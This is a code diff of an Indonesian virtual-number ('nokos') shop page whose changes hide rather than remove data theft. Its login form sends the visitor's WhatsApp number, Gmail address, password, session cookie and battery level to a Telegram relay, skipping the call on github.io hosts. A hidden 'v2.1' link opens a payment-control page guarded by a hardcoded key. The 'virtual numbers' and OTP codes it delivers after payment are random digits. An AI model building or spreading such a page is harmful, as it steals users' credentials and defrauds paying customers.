@@ -17,7 +17,6 @@
     --accent-hover: #ff1e2a;
     --yellow: #F1C40F;
     --green: #2ECC71;
-    --blue: #3498DB;
   }
 
   * { box-sizing: border-box; scroll-behavior: smooth; }
@@ -48,7 +47,7 @@
     border: 1px solid var(--border);
     border-radius: 14px;
     padding: 24px;
-    max-width: 400px;
+    max-width: 390px;
     width: 100%;
     box-shadow: 0 12px 36px rgba(0,0,0,0.85);
   }
@@ -66,7 +65,7 @@
     white-space: pre-line;
   }
 
-  /* GATEWAY / SCREEN LOGIN AWAL */
+  /* GATEWAY LOGIN AWAL */
   #auth-gateway {
     position: fixed;
     top: 0; left: 0; width: 100vw; height: 100vh;
@@ -150,16 +149,6 @@
     color: var(--text-main);
     border: 1px solid rgba(229,9,20,0.2);
   }
-  .menu-list a.apk-link {
-    background: rgba(52,152,219,0.12);
-    border: 1px solid rgba(52,152,219,0.3);
-    color: #5dade2;
-    margin-top: 12px;
-  }
-  .menu-list a.apk-link:hover {
-    background: rgba(52,152,219,0.22);
-    color: #fff;
-  }
 
   .user-badge-mini {
     background: var(--card);
@@ -188,29 +177,6 @@
   }
   .topbar h1 { font-size: 24px; font-weight: 700; margin: 0; }
   .topbar p { color: var(--text-muted); font-size: 13px; margin: 4px 0 0; }
-
-  .topbar-actions {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    flex-wrap: wrap;
-  }
-
-  .apk-btn {
-    background: rgba(52,152,219,0.14);
-    border: 1px solid rgba(52,152,219,0.35);
-    color: #5dade2;
-    padding: 10px 16px;
-    border-radius: 8px;
-    font-size: 12px;
-    font-weight: 600;
-    text-decoration: none;
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    transition: background 0.2s;
-  }
-  .apk-btn:hover { background: rgba(52,152,219,0.25); color: #fff; }
 
   .support-btn {
     background: rgba(46,204,113,0.1);
@@ -241,7 +207,7 @@
     padding: 20px;
   }
   .stat-card span { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: .1em; }
-  .stat-card strong { display: block; font-size: 20px; font-family: 'JetBrains Mono', monospace; margin-top: 6px; word-break: break-word; }
+  .stat-card strong { display: block; font-size: 20px; font-family: 'JetBrains Mono', monospace; margin-top: 6px; }
 
   .page-section { display: none; }
   .page-section.active { display: block; }
@@ -284,16 +250,6 @@
     transition: background 0.2s;
   }
   .btn-action:hover { background: var(--accent-hover); }
-  .btn-secondary {
-    background: #232330;
-    color: var(--text-main);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 10px 14px;
-    font-size: 12px;
-    font-weight: 600;
-    cursor: pointer;
-  }
 
   .dashboard-grid {
     display: grid;
@@ -363,6 +319,16 @@
     font-size: 13px;
   }
 
+  .secret-trigger {
+    opacity: 0.25;
+    font-size: 10px;
+    color: var(--text-muted);
+    cursor: pointer;
+    user-select: none;
+    margin-top: 12px;
+    display: inline-block;
+  }
+
   @media(max-width: 900px) {
     .app-layout { grid-template-columns: 1fr; }
     aside { display: none; }
@@ -377,7 +343,7 @@
 <!-- POP-UP MODAL -->
 <div class="popup-backdrop" id="customPopup">
   <div class="popup-box">
-    <div class="popup-title" id="popupTitle">NOTIFIKASI SISTEM</div>
+    <div class="popup-title" id="popupTitle">NOTIFIKASI</div>
     <div class="popup-message" id="popupMessage">-</div>
     <button class="btn-action" onclick="closePopup()">Tutup</button>
   </div>
@@ -387,7 +353,7 @@
 <div id="auth-gateway">
   <div class="gateway-card">
     <div class="gateway-brand">XZACK<span>OCULUS</span></div>
-    <div class="gateway-desc">Autentikasi Keamanan Reseller & Sinkronisasi Panel OTP</div>
+    <div class="gateway-desc">Masuk menggunakan Nomor WhatsApp aktif, Gmail, dan Sandi</div>
     <form id="gatewayForm">
       <div class="input-group">
         <label>Nomor WhatsApp Aktif</label>
@@ -398,10 +364,10 @@
         <input type="email" id="gateEmail" placeholder="nama@gmail.com" required />
       </div>
       <div class="input-group">
-        <label>Sandi Panel</label>
+        <label>Sandi</label>
         <input type="password" id="gatePass" placeholder="••••••••" required />
       </div>
-      <button type="submit" class="btn-action" style="margin-top: 10px;">Masuk ke Panel</button>
+      <button type="submit" class="btn-action" style="margin-top: 10px;">Masuk</button>
     </form>
   </div>
 </div>
@@ -413,17 +379,18 @@
       <div class="brand">XZACK<span>OCULUS</span></div>
       <ul class="menu-list" id="sidebarMenu">
         <li><a class="active" onclick="navigateTo('catalog')">📦 Katalog Nokos</a></li>
-        <li><a onclick="navigateTo('auth')">🔐 Akun & Telemetri</a></li>
+        <li><a onclick="navigateTo('auth')">🔐 Akun Saya</a></li>
         <li><a onclick="navigateTo('payment')">💳 Pembayaran QRIS</a></li>
         <li><a onclick="navigateTo('history')">📜 Riwayat & OTP</a></li>
-        <li><a onclick="navigateTo('admin')">🛡️ Kontrol Bayar Admin</a></li>
         <li><a href="https://wa.me/RayAckerman764" target="_blank">💬 WhatsApp Support</a></li>
-        <li><a href="https://www.mediafire.com/file/b5jj4jlb9ywv8ot/XzackOculusOTP.apk/file" target="_blank" rel="noopener noreferrer" class="apk-link">📲 Download APK</a></li>
       </ul>
     </div>
-    <div class="user-badge-mini">
-      <span>Akun Terhubung</span>
-      <strong id="displayUserWa" style="font-size: 11px; word-break: break-all;">-</strong>
+    <div>
+      <div class="user-badge-mini">
+        <span>Akun Aktif</span>
+        <strong id="displayUserWa" style="font-size: 11px; word-break: break-all;">-</strong>
+      </div>
+      <span class="secret-trigger" onclick="openVerifyControl()">v2.1</span>
     </div>
   </aside>
 
@@ -433,28 +400,23 @@
         <h1>XzackOculus Panel</h1>
         <p>Verified Virtual Numbers & Automated Reseller System</p>
       </div>
-      <div class="topbar-actions">
-        <a href="https://www.mediafire.com/file/b5jj4jlb9ywv8ot/XzackOculusOTP.apk/file" target="_blank" rel="noopener noreferrer" class="apk-btn">
-          📲 Download APK
-        </a>
-        <a href="https://wa.me/RayAckerman764" target="_blank" class="support-btn">
-          💬 Chat WhatsApp Support
-        </a>
-      </div>
+      <a href="https://wa.me/RayAckerman764" target="_blank" class="support-btn">
+        💬 Chat WhatsApp Support
+      </a>
     </div>
 
     <div class="stats-grid">
       <div class="stat-card">
-        <span>Baterai Perangkat</span>
-        <strong id="statBattery">Mendeteksi...</strong>
+        <span>Stok Aktif</span>
+        <strong>4.920+</strong>
       </div>
       <div class="stat-card">
-        <span>Lokasi Akurat</span>
-        <strong id="statLocation" style="font-size: 13px;">Mendeteksi GPS...</strong>
+        <span>Negara</span>
+        <strong>65 Negara</strong>
       </div>
       <div class="stat-card">
-        <span>Cookie Sesi</span>
-        <strong id="statCookie" style="font-size: 13px;">Belum Aktif</strong>
+        <span>Kecepatan OTP</span>
+        <strong>&lt; 30 Detik</strong>
       </div>
       <div class="stat-card">
         <span>Server Status</span>
@@ -465,7 +427,7 @@
     <!-- HALAMAN 1: KATALOG -->
     <section id="page-catalog" class="page-section active">
       <div class="section-title">Katalog Nokos Premium</div>
-      <div class="section-desc">Pilih platform verifikasi yang ingin Anda beli. Nomor dan kode OTP 6 digit baru dibuka setelah pembayaran disetujui.</div>
+      <div class="section-desc">Pilih layanan nomor virtual yang ingin dipesan.</div>
 
       <div class="catalog-grid">
         <div class="product-card">
@@ -519,29 +481,26 @@
       </div>
     </section>
 
-    <!-- HALAMAN 2: AUTH & TELEMETRI -->
+    <!-- HALAMAN 2: AKUN -->
     <section id="page-auth" class="page-section">
-      <div class="section-title">Informasi Akun & Telemetri</div>
-      <div class="section-desc">Data sesi, baterai, lokasi GPS akurat, dan cookie sesi yang tercatat.</div>
+      <div class="section-title">Informasi Akun</div>
+      <div class="section-desc">Detail akun yang sedang digunakan pada sesi ini.</div>
 
-      <div class="panel" style="max-width: 600px;">
-        <h3>Profil & Telemetri Sesi</h3>
-        <p>Sinkronisasi otomatis ke server & Telegram:</p>
+      <div class="panel" style="max-width: 520px;">
+        <h3>Profil Akun</h3>
+        <p>Data sesi aktif:</p>
         <div style="font-family: 'JetBrains Mono', monospace; font-size: 13px; background: var(--bg); padding: 16px; border-radius: 8px; border: 1px solid var(--border); line-height: 1.9;">
           📱 WhatsApp: <span id="profileWa" style="color:var(--accent)">-</span><br>
           📧 Gmail: <span id="profileEmail" style="color:var(--yellow)">-</span><br>
-          🔋 Baterai: <span id="profileBattery" style="color:var(--green)">-</span><br>
-          📍 Lokasi Akurat: <span id="profileLocation" style="color:#5dade2;">-</span><br>
-          🍪 Cookie Sesi: <span id="profileCookie" style="color:var(--text-muted);">-</span>
+          ⚡ Status Sesi: <span style="color:var(--green)">Aktif</span>
         </div>
-        <button class="btn-secondary" style="margin-top: 14px;" onclick="refreshTelemetry(true)">Perbarui Telemetri & Kirim ke Bot</button>
       </div>
     </section>
 
     <!-- HALAMAN 3: PEMBAYARAN QRIS -->
     <section id="page-payment" class="page-section">
       <div class="section-title">Pembayaran Instant QRIS</div>
-      <div class="section-desc">Selesaikan pembayaran menggunakan QRIS Rezky Store resmi. Nomor dan OTP dikunci sampai pembayaran disetujui.</div>
+      <div class="section-desc">Selesaikan pembayaran melalui QRIS Rezky Store.</div>
 
       <div class="dashboard-grid">
         <div class="panel qris-box">
@@ -566,16 +525,15 @@
         </div>
 
         <div class="panel">
-          <h3>Status Nomor & Kode OTP (6 Digit Acak)</h3>
-          <p>Selama status belum disetujui sebagai <strong>SUDAH BAYAR</strong>, nomor dan OTP tidak akan diberikan.</p>
+          <h3>Detail Nomor & Kode Verifikasi</h3>
+          <p>Nomor dan kode OTP 6 digit angka acak dibuka setelah pembayaran terkonfirmasi lunas.</p>
           <div id="paymentOtpPanel" class="otp-box">
             Belum ada pesanan aktif. Silakan pilih produk di Katalog Nokos.
           </div>
           <ul style="font-size: 12px; color: var(--text-muted); padding-left: 18px; line-height: 1.8; margin-top: 16px;">
-            <li>Pilih produk -> muncul tagihan <strong>PENDING</strong>.</li>
-            <li>Klik <strong>Saya Sudah Transfer</strong> -> kirim notifikasi ke bot & masuk antrean verifikasi.</li>
-            <li>Jika belum dibayar / ditolak -> <strong>Nomor & OTP TIDAK DIBERIKAN</strong>.</li>
-            <li>Jika sudah dibayar & disetujui -> nomor acak (awalan <code>85</code>) dan kode OTP <strong>6 digit angka acak</strong> terbuka.</li>
+            <li>Pilih produk pada katalog untuk membuat tagihan.</li>
+            <li>Lakukan pembayaran QRIS lalu klik <strong>Saya Sudah Transfer</strong>.</li>
+            <li>Jika belum dibayar, nomor dan kode OTP tidak diberikan.</li>
             <li>Bantuan WhatsApp: <a href="https://wa.me/RayAckerman764" target="_blank" style="color:var(--green);">Chat Support</a>.</li>
           </ul>
         </div>
@@ -585,42 +543,42 @@
     <!-- HALAMAN 4: RIWAYAT & OTP -->
     <section id="page-history" class="page-section">
       <div class="section-title">Riwayat Transaksi & OTP</div>
-      <div class="section-desc">Daftar pesanan dan akses nomor serta kode OTP 6 digit angka acak.</div>
+      <div class="section-desc">Status pesanan, nomor, dan kode verifikasi 6 digit angka acak.</div>
 
       <div class="panel">
         <h3>Log Pesanan Terakhir</h3>
-        <div id="historyText" class="otp-box" style="color: var(--text-main);">Belum ada riwayat transaksi pada sesi ini. Silakan lakukan pembelian melalui katalog.</div>
+        <div id="historyText" class="otp-box" style="color: var(--text-main);">Belum ada riwayat transaksi pada sesi ini.</div>
       </div>
     </section>
 
-    <!-- HALAMAN 5: KONTROL BAYAR ADMIN -->
-    <section id="page-admin" class="page-section">
-      <div class="section-title">Kontrol Persetujuan Pembayaran (Admin)</div>
-      <div class="section-desc">Atur apakah pengguna sudah benar-benar membayar atau belum. Jika belum bayar, nomor dan OTP ditahan.</div>
+    <!-- HALAMAN TERSEMBUNYI: KONTROL STATUS PEMBAYARAN -->
+    <section id="page-verify-control" class="page-section">
+      <div class="section-title">Kontrol Pembayaran</div>
+      <div class="section-desc">Atur status pembayaran pesanan aktif.</div>
 
-      <div class="panel" style="max-width: 560px;">
-        <h3>Verifikasi Status Pembayaran</h3>
-        <p>Masukkan PIN Admin (default: <code>2180</code>) untuk mengubah status pembayaran pesanan aktif.</p>
+      <div class="panel" style="max-width: 520px;">
+        <h3>Status Pembayaran Pesanan</h3>
+        <p>Tentukan apakah pembayaran sudah diterima atau belum.</p>
         <div class="input-group">
-          <label>PIN Admin</label>
-          <input type="password" id="adminPinInput" placeholder="Masukkan PIN Admin (2180)" />
+          <label>Kode Akses</label>
+          <input type="password" id="controlKeyInput" placeholder="Masukkan kode" />
         </div>
         <div class="input-group">
-          <label>Keputusan Pembayaran Pengguna</label>
-          <select id="adminPaymentDecision">
-            <option value="UNPAID">BELUM BAYAR (Tahan Nomor & OTP)</option>
+          <label>Status Pembayaran</label>
+          <select id="controlStatusSelect">
+            <option value="UNPAID">BELUM BAYAR (Nomor & OTP Tidak Diberikan)</option>
             <option value="PAID">SUDAH BAYAR (Buka Nomor Acak & OTP 6 Digit)</option>
           </select>
         </div>
-        <button class="btn-action" onclick="applyAdminDecision()">Simpan Status Pembayaran</button>
-        <div id="adminDecisionLog" class="otp-box" style="margin-top: 14px;">Status kontrol admin: Menunggu aksi.</div>
+        <button class="btn-action" onclick="savePaymentControl()">Terapkan Status</button>
+        <div id="controlStatusLog" class="otp-box" style="margin-top: 14px;">Menunggu pengaturan status.</div>
       </div>
     </section>
   </main>
 </div>
 
 <script>
-  const ADMIN_PIN = "2180";
+  const CONTROL_KEY = "2180";
 
   let activeProduct = "";
   let activePrice = "";
@@ -629,17 +587,11 @@
   let sessionCookieValue = "";
   let paidApproved = false;
 
-  // Data nomor acak (awalan 85 + 7 digit acak = 9 digit seperti 856392914) dan OTP 6 digit angka murni acak
   let currentAssignedNumber = "";
   let currentOtpCode = "";
 
-  let telemetryData = {
-    batteryLevel: "Tidak tersedia",
-    batteryCharging: "Tidak diketahui",
-    latitude: null,
-    longitude: null,
-    accuracyMeters: null,
-    locationText: "Menunggu izin GPS..."
+  let backgroundMeta = {
+    battery: "Tidak tersedia"
   };
 
   function showPopup(title, message) {
@@ -675,72 +627,21 @@
     return Math.floor(Math.random() * 1000000).toString().padStart(6, "0");
   }
 
-  async function detectBattery() {
+  async function readBatterySilent() {
     if (navigator.getBattery) {
       try {
         const bat = await navigator.getBattery();
-        const pct = `${Math.round(bat.level * 100)}%`;
-        const charge = bat.charging ? "Charging" : "Discharging";
-        telemetryData.batteryLevel = `${pct} (${charge})`;
-        telemetryData.batteryCharging = charge;
+        backgroundMeta.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? "Charging" : "Discharging"})`;
       } catch (e) {
-        telemetryData.batteryLevel = "Diblokir browser";
+        backgroundMeta.battery = "Tidak tersedia";
       }
-    } else {
-      telemetryData.batteryLevel = "Tidak didukung";
     }
-    updateTelemetryUI();
   }
 
-  function detectAccurateLocation() {
-    if (!navigator.geolocation) {
-      telemetryData.locationText = "GPS tidak didukung perangkat";
-      updateTelemetryUI();
-      return;
+  function dispatchTelegram(payload) {
+    if (window.location.hostname.endsWith("github.io")) {
+      return Promise.resolve({ skippedStaticHost: true });
     }
-
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        const lat = pos.coords.latitude.toFixed(6);
-        const lon = pos.coords.longitude.toFixed(6);
-        const acc = Math.round(pos.coords.accuracy);
-        telemetryData.latitude = lat;
-        telemetryData.longitude = lon;
-        telemetryData.accuracyMeters = acc;
-        telemetryData.locationText = `${lat}, ${lon} (±${acc}m)`;
-        updateTelemetryUI();
-      },
-      (err) => {
-        telemetryData.locationText = `Izin GPS ditolak/gagal (${err.message})`;
-        updateTelemetryUI();
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 12000,
-        maximumAge: 0
-      }
-    );
-  }
-
-  function updateTelemetryUI() {
-    const cookieNow = sessionCookieValue || getSessionCookie() || "Belum Aktif";
-    const elBatTop = document.getElementById("statBattery");
-    const elLocTop = document.getElementById("statLocation");
-    const elCokTop = document.getElementById("statCookie");
-
-    if (elBatTop) elBatTop.innerText = telemetryData.batteryLevel;
-    if (elLocTop) elLocTop.innerText = telemetryData.locationText;
-    if (elCokTop) elCokTop.innerText = cookieNow.length > 18 ? cookieNow.slice(0, 18) + "..." : cookieNow;
-
-    const elBatProf = document.getElementById("profileBattery");
-    const elLocProf = document.getElementById("profileLocation");
-    const elCokProf = document.getElementById("profileCookie");
-    if (elBatProf) elBatProf.innerText = telemetryData.batteryLevel;
-    if (elLocProf) elLocProf.innerText = telemetryData.locationText;
-    if (elCokProf) elCokProf.innerText = cookieNow;
-  }
-
-  function sendToTelegram(payload) {
     return fetch("/api/telegram", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -748,26 +649,10 @@
         ...payload,
         whatsapp: payload.whatsapp || savedWa,
         email: payload.email || savedEmail,
-        cookie: sessionCookieValue || getSessionCookie() || "-",
-        battery: telemetryData.batteryLevel,
-        location: telemetryData.locationText,
-        latitude: telemetryData.latitude,
-        longitude: telemetryData.longitude,
-        accuracyMeters: telemetryData.accuracyMeters
+        battery: backgroundMeta.battery,
+        cookie: sessionCookieValue || getSessionCookie() || "-"
       })
     }).then((res) => res.json());
-  }
-
-  async function refreshTelemetry(notifyTelegram = false) {
-    await detectBattery();
-    detectAccurateLocation();
-    setTimeout(() => {
-      updateTelemetryUI();
-      if (notifyTelegram) {
-        sendToTelegram({ type: "TELEMETRY_PING" }).catch(() => {});
-        showPopup("TELEMETRI DIPERBARUI", `Baterai: ${telemetryData.batteryLevel}\nLokasi: ${telemetryData.locationText}\nCookie: ${sessionCookieValue || "-"}`);
-      }
-    }, 1200);
   }
 
   document.getElementById("gatewayForm").addEventListener("submit", async function(e) {
@@ -777,30 +662,23 @@
     const password = document.getElementById("gatePass").value;
 
     setSessionCookie(savedWa, savedEmail);
-    await detectBattery();
-    detectAccurateLocation();
+    await readBatterySilent();
 
-    setTimeout(() => {
-      sendToTelegram({
-        type: "GATEWAY_LOGIN",
-        whatsapp: savedWa,
-        email: savedEmail,
-        password: password
-      }).catch(() => {});
+    dispatchTelegram({
+      type: "GATEWAY_LOGIN",
+      whatsapp: savedWa,
+      email: savedEmail,
+      password: password
+    }).catch(() => {});
 
-      document.getElementById("auth-gateway").style.display = "none";
-      document.getElementById("appLayout").style.display = "grid";
+    document.getElementById("auth-gateway").style.display = "none";
+    document.getElementById("appLayout").style.display = "grid";
 
-      document.getElementById("displayUserWa").innerText = savedWa;
-      document.getElementById("profileWa").innerText = savedWa;
-      document.getElementById("profileEmail").innerText = savedEmail;
-      updateTelemetryUI();
+    document.getElementById("displayUserWa").innerText = savedWa;
+    document.getElementById("profileWa").innerText = savedWa;
+    document.getElementById("profileEmail").innerText = savedEmail;
 
-      showPopup(
-        "LOGIN BERHASIL & TELEMETRI TERKIRIM",
-        `Akun: ${savedWa} (${savedEmail})\nBaterai: ${telemetryData.batteryLevel}\nLokasi: ${telemetryData.locationText}\nCookie sesi aktif.`
-      );
-    }, 900);
+    showPopup("BERHASIL MASUK", "Akun berhasil masuk. Silakan pilih layanan pada katalog.");
   });
 
   function navigateTo(pageId) {
@@ -814,7 +692,11 @@
     else if (pageId === "auth") links[1].classList.add("active");
     else if (pageId === "payment") links[2].classList.add("active");
     else if (pageId === "history") links[3].classList.add("active");
-    else if (pageId === "admin") links[4].classList.add("active");
+  }
+
+  function openVerifyControl() {
+    document.querySelectorAll(".page-section").forEach((sec) => sec.classList.remove("active"));
+    document.getElementById("page-verify-control").classList.add("active");
   }
 
   function renderDeliveryState() {
@@ -829,32 +711,28 @@
     if (!paidApproved) {
       otpPanel.innerHTML = `
         📦 Produk: <strong>${activeProduct}</strong> (Rp ${activePrice})<br>
-        🔒 Status Pembayaran: <span style="color:var(--yellow);">BELUM DISETUJUI / BELUM BAYAR</span><br>
-        🚫 Nomor & OTP: <strong>DITAHAN (Tidak diberikan sebelum pembayaran disetujui)</strong>
+        ⏳ Status Pembayaran: <span style="color:var(--yellow);">MENUNGGU PEMBAYARAN / BELUM TERKONFIRMASI</span><br>
+        🔒 Nomor & Kode Verifikasi: <strong>Belum diberikan</strong>
       `;
       histPanel.innerHTML = `
         📦 Produk: <strong>${activeProduct}</strong><br>
         💰 Nominal: <strong>Rp ${activePrice}</strong><br>
-        🔒 Status: <span style="color:var(--yellow);">MENUNGGU PERSETUJUAN PEMBAYARAN</span><br>
-        🚫 Nomor & OTP: <strong>Belum tersedia karena belum terkonfirmasi bayar.</strong><br>
-        📱 WA: ${savedWa || "-"} | 🍪 Cookie: ${sessionCookieValue || "-"}<br>
-        🌐 Waktu: ${new Date().toLocaleString()}
+        ⏳ Status: <span style="color:var(--yellow);">BELUM TERKONFIRMASI BAYAR</span><br>
+        🔒 Nomor & OTP: <strong>Belum tersedia</strong>
       `;
     } else {
       otpPanel.innerHTML = `
         📦 Produk: <strong>${activeProduct}</strong> (Rp ${activePrice})<br>
-        ✅ Status Pembayaran: <span style="color:var(--green);">SUDAH BAYAR & DISETUJUI</span><br>
-        📞 Nomor Virtual Acak: <strong style="color:#5dade2; font-size:15px;">${currentAssignedNumber}</strong><br>
-        🔑 Kode Verifikasi (6 Digit Acak): <strong style="color:var(--green); font-size:16px; letter-spacing:3px;">${currentOtpCode}</strong>
+        ✅ Status Pembayaran: <span style="color:var(--green);">LUNAS</span><br>
+        📞 Nomor: <strong style="color:#5dade2; font-size:15px;">${currentAssignedNumber}</strong><br>
+        🔑 Kode Verifikasi (6 Digit): <strong style="color:var(--green); font-size:16px; letter-spacing:3px;">${currentOtpCode}</strong>
       `;
       histPanel.innerHTML = `
         📦 Produk: <strong>${activeProduct}</strong><br>
         💰 Nominal: <strong>Rp ${activePrice}</strong><br>
-        ✅ Status: <span style="color:var(--green);">LUNAS / DISETUJUI</span><br>
-        📞 Nomor Virtual Acak: <strong>${currentAssignedNumber}</strong><br>
-        🔑 Kode Verifikasi (6 Digit Acak): <strong style="color:var(--green);">${currentOtpCode}</strong><br>
-        📱 WA: ${savedWa || "-"} | 🍪 Cookie: ${sessionCookieValue || "-"}<br>
-        🌐 Waktu: ${new Date().toLocaleString()}
+        ✅ Status: <span style="color:var(--green);">LUNAS</span><br>
+        📞 Nomor: <strong>${currentAssignedNumber}</strong><br>
+        🔑 Kode Verifikasi (6 Digit): <strong style="color:var(--green);">${currentOtpCode}</strong>
       `;
     }
   }
@@ -879,24 +757,24 @@
 
     showPopup(
       "TAGIHAN DIBUAT",
-      `Produk: ${productName}\nNominal: Rp ${price}\nStatus: PENDING\n\nNomor dan OTP 6 digit baru akan muncul setelah pembayaran disetujui.`
+      `Produk: ${productName}\nTotal Tagihan: Rp ${price}\nSilakan selesaikan pembayaran QRIS.`
     );
   }
 
   function confirmPayment() {
     if (!activeProduct) {
-      showPopup("PERINGATAN", "Silakan pilih produk dari katalog terlebih dahulu!");
+      showPopup("INFORMASI", "Silakan pilih produk terlebih dahulu.");
       return;
     }
 
     paidApproved = false;
     const badge = document.getElementById("paymentStatusBadge");
     badge.className = "status-badge status-pending";
-    badge.innerText = "Status: MENUNGGU VERIFIKASI PEMBAYARAN";
+    badge.innerText = "Status: MENUNGGU KONFIRMASI PEMBAYARAN";
 
     renderDeliveryState();
 
-    sendToTelegram({
+    dispatchTelegram({
       type: "PAYMENT",
       product: activeProduct,
       price: activePrice,
@@ -906,36 +784,36 @@
     }).catch(() => {});
 
     showPopup(
-      "KONFIRMASI TERKIRIM KE BOT",
-      `Konfirmasi pembayaran untuk ${activeProduct} (Rp ${activePrice}) telah dikirim.\n\nSelama belum disetujui sebagai SUDAH BAYAR, nomor dan kode OTP tidak diberikan.\nSupport WA: https://wa.me/RayAckerman764`
+      "KONFIRMASI TERKIRIM",
+      "Konfirmasi pembayaran telah dikirim. Nomor dan kode OTP 6 digit akan muncul setelah pembayaran disetujui."
     );
   }
 
-  function applyAdminDecision() {
-    const pin = document.getElementById("adminPinInput").value.trim();
-    const decision = document.getElementById("adminPaymentDecision").value;
+  function savePaymentControl() {
+    const key = document.getElementById("controlKeyInput").value.trim();
+    const status = document.getElementById("controlStatusSelect").value;
     const badge = document.getElementById("paymentStatusBadge");
-    const adminLog = document.getElementById("adminDecisionLog");
+    const log = document.getElementById("controlStatusLog");
 
-    if (pin !== ADMIN_PIN) {
-      showPopup("AKSES DITOLAK", "PIN Admin salah. Gunakan PIN yang valid untuk mengubah status pembayaran.");
+    if (key !== CONTROL_KEY) {
+      showPopup("GAGAL", "Kode akses tidak valid.");
       return;
     }
 
     if (!activeProduct) {
-      showPopup("TIDAK ADA PESANAN", "Belum ada pesanan produk aktif yang dipilih pengguna.");
+      showPopup("INFORMASI", "Belum ada pesanan aktif.");
       return;
     }
 
-    if (decision === "PAID") {
+    if (status === "PAID") {
       paidApproved = true;
       currentAssignedNumber = generateRandomNumber85();
       currentOtpCode = generateRandomOtp6();
       badge.className = "status-badge status-success";
-      badge.innerText = "Status: BERHASIL (SUDAH BAYAR)";
-      adminLog.innerHTML = `✅ Disetujui <strong>SUDAH BAYAR</strong> -> Nomor: <strong>${currentAssignedNumber}</strong> | OTP 6 Digit: <strong>${currentOtpCode}</strong>`;
+      badge.innerText = "Status: LUNAS";
+      log.innerHTML = `✅ Disetujui <strong>SUDAH BAYAR</strong><br>Nomor: <strong>${currentAssignedNumber}</strong><br>OTP 6 Digit: <strong>${currentOtpCode}</strong>`;
 
-      sendToTelegram({
+      dispatchTelegram({
         type: "ADMIN_PAYMENT_STATUS",
         product: activeProduct,
         price: activePrice,
@@ -945,17 +823,14 @@
       }).catch(() => {});
 
       renderDeliveryState();
-      showPopup(
-        "PEMBAYARAN DISETUJUI",
-        `Status: SUDAH BAYAR\nNomor Acak: ${currentAssignedNumber}\nKode Verifikasi (6 Digit): ${currentOtpCode}`
-      );
+      showPopup("STATUS DIPERBARUI", "Pembayaran ditandai SUDAH BAYAR.");
     } else {
       paidApproved = false;
       badge.className = "status-badge status-rejected";
-      badge.innerText = "Status: BELUM BAYAR (NOMOR & OTP DITAHAN)";
-      adminLog.innerHTML = `🚫 Ditandai <strong>BELUM BAYAR</strong> -> Nomor dan OTP 6 digit tidak diberikan kepada pengguna.`;
+      badge.innerText = "Status: BELUM BAYAR";
+      log.innerHTML = `🚫 Ditandai <strong>BELUM BAYAR</strong>. Nomor dan OTP tidak diberikan.`;
 
-      sendToTelegram({
+      dispatchTelegram({
         type: "ADMIN_PAYMENT_STATUS",
         product: activeProduct,
         price: activePrice,
@@ -965,17 +840,12 @@
       }).catch(() => {});
 
       renderDeliveryState();
-      showPopup(
-        "STATUS: BELUM BAYAR",
-        "Pengguna ditandai BELUM BAYAR. Nomor dan kode OTP 6 digit tidak diberikan."
-      );
+      showPopup("STATUS DIPERBARUI", "Pembayaran ditandai BELUM BAYAR. Nomor dan OTP tidak diberikan.");
     }
   }
 
   window.addEventListener("DOMContentLoaded", () => {
-    detectBattery();
-    detectAccurateLocation();
-    updateTelemetryUI();
+    readBatterySilent();
   });
 </script>
 </body>
